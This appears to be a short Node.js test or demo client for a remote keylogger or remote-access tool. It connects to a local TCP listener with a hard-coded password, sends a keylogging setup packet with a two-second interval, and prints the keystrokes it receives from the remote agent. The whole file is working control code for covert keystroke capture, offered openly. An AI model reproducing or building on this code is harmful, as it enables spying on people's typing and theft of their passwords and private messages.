const Client = require('./src/Client')
const { Packets } = require('./src/lib/Protocol')

// Wow, much amaze, such BREAKING OCP BUT meh

var client = new Client()
client.connect(
  41233,
  '127.0.0.1',
  'Hello123',
  function () {
    console.log('CONNECT')
    this._TCPclient.write(Packets.KeylogSetup.create({ interval: 2000 }))
    // this._TCPclient.write(Packets.KeylogSetup.create({interval: 0}))

    this.on(Packets.r_Keylog, function (packet) {
      console.log('Received key strokes:', String.fromCharCode(...packet.data))
    })
  }
)
